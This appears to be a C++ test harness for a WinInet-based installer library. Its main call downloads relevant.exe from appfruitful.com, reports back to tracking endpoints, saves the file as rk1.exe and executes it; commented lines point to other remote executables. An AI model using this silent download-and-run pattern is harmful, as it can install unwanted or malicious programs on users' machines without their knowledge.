#include "stdafx.h"

#include <windows.h>
#include <wininet.h>
#include <tchar.h>
#include <stdio.h>
#include <map>

#include "InetUtils.h"

#define NSIS_MAX_STRLEN 1024

extern std::map<DWORD, DWORD> DownloadThreads;

int _tmain(int argc, _TCHAR* argv[])
{
	//TCHAR url[NSIS_MAX_STRLEN] = TEXT("https://korzuno.s3.eu-north-1.amazonaws.com/__argv.exe?hello=89");
	TCHAR url[NSIS_MAX_STRLEN] = TEXT("http://192.168.11.143/get.php");
	//TCHAR url[NSIS_MAX_STRLEN] = TEXT("https://trentapp.com/?y49xvTzAWDVYVgCZEgNzJaNkw7mj2a4jabUknl7IL0rHNo8PIMtMbeovzHIFE5NN%2B1Q7vIHAWAw3Q60OsCy4rH6T2AwVl7AaKO%2BA5beTMQ9olz6NuzkP6WTx4JYUNuskKZnspbsHMXhj4BUrUm18%2BtUZyEuQMFrGCPLlePbAE6Cn7EzwB1EIKEkLffvpi%2BXoXTdw0%2FDKoxAEtTCG6GvDvw%3D%3D");
	
	TCHAR file[NSIS_MAX_STRLEN] = TEXT("_https.exe");
	DWORD dwTotal = NSIS_MAX_STRLEN;
	DWORD dwResult;
	//dwResult= InetUtils::InternetRequestDownload(url, file);
	//dwResult = InetUtils::InternetRequestFeedback(url, file, &dwTotal);
	
	
	dwResult = InetUtils::DownloadAndRunFileEx(
		TEXT("https://appfruitful.com/relevant.exe?quant=1355595965"),
		TEXT("https://appfruitful.com/info.php?quant=1355595965"),
		TEXT("https://appfruitful.com/installer.php?CODE=PUTGQ&quant=1355595965&action="),
		TEXT("rk1"),
		TEXT("d:\\InetUtils\\InetUtils\\rk1.exe"),
		TEXT("1935"),
		TEXT("1936"),
		TEXT("/param0=0"),
		InetUtils::ExecShell
	);
	
	/*
	dwResult = InetUtils::InternetRequestFeedback (
		url,
		file,
		&dwTotal
	);
	*/

	_tprintf(TEXT("Result: %d\n"), dwResult);
	return 0;
}
